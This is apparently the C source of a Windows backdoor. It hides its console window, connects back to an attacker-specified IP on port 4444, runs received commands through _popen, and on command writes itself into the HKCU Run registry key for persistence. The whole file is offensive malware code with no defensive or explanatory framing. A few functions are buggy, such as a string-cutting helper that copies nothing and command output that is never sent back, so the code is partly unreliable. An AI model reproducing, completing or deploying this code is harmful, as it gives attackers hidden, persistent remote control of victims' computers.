#include <stdio.h>
#include <winsock2.h>
#include <conio.h>
#include <windows.h>
#include <stdlib.h>
#include <unistd.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;


int bootRun(){

	char err[128] = "Failed\n";
	char suc[128] = "Created Presistence At : HkEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
	TCHAR szPath[MAX_PATH];
	DWORD pathLen = 0;

	pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
	if (pathLen == 0){
		send(sock, err, sizeof(err),0);
		return -1;
	}
		HKEY NewVal;

		if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS){
				send(sock, err, sizeof(err), 0);
				return -1;
			}
			DWORD pathLenInBytes = pathLen * sizeof(*szPath);
			if (RegSetValueEx(NewVal, TEXT("BSW"), 0, REG_SZ, (LPBYTE)szPath,pathLenInBytes) != ERROR_SUCCESS)
			{
					RegCloseKey(NewVal);
					send(sock, err, sizeof(err),0);
					return -1;
			}

			RegCloseKey(NewVal);
			send(sock, suc, sizeof(suc), 0);
			return 0;
}




char *
str_cut(char str[], int slice_from, int slice_to)
{

	if (str[0]== '\0')
		return NULL;

	char *buffer;
	size_t str_len, buffer_len;

	if (slice_to < 0 && slice_from > slice_to){
		str_len = strlen(str);
		if (abs(slice_to) > str_len -1)
				return NULL;

		if (abs(slice_from)> str_len)
				slice_from = (-1) * str_len;

		buffer_len = slice_to - slice_from;
		str += (str_len + slice_from);
	}

	else if (slice_from >= 0 && slice_to > slice_from)
	{

		str_len = strlen(str);

		if (slice_from > str_len - 1)
			return NULL;
		buffer_len =  slice_to - slice_from;
		str += slice_from;

	} else
 		return NULL;


		buffer = calloc(buffer_len, sizeof(char));
		return buffer;
}


void shell(){
	char buffer[1024];
	char container[1024];
	char total_response[18384];

	while (1){
		jump:
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);

		if (strncmp("q", buffer, 1)==0) {
			closesocket(sock);
			WSACleanup();
			exit(0);
		}
		else if (strncmp("cd ", buffer, 3)== 0){
			chdir(str_cut(buffer,3,100));
		}
		else if (strncmp("presist", buffer, 7) == 0){
				bootRun();
		}
		else {
			FILE * fp;
			fp =  _popen(buffer, "r");
			while (fgets(container,1024,fp) != NULL){
			strcat(total_response, container);
			}
		}
	}
}



int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPev, LPSTR lpCmdLine, int nCmdShow)
{
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);

	ShowWindow(stealth,0);

	struct sockaddr_in ServAddr;
	unsigned short ServPort;
	char *ServIP;
	WSADATA wsaData;

	ServIP = "MY IP :)";
	ServPort = 4444;

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
{
	exit(1);
}

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&ServAddr, 0, sizeof(ServAddr));

	ServAddr.sin_family = AF_INET;
	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
	ServAddr.sin_port = htons(ServPort);

	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof (ServAddr) != 0)){

	sleep(2);
	goto start;

	}
	shell();


}
